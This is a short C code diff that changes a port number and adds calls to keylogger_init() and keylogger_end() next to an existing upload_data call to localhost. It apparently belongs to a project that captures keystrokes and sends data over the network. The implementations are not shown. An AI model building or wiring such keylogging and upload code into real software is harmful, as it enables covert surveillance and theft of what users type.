@@ -9,7 +9,7 @@
 #include "../include/plugin_utils.h"
 #include "../include/network_utils.h"
 
-#define PORT 9091
+#define PORT 9092
 
 int main()
 {
@@ -30,6 +30,13 @@ int main()
 	{
 		sleep(2);
 		upload_data("127.0.0.1", PORT, "testing", strlen("testing"));
+
+
+		keylogger_init();
+
+		sleep(2);
+
+		keylogger_end();
 	}
 
 	return OK;
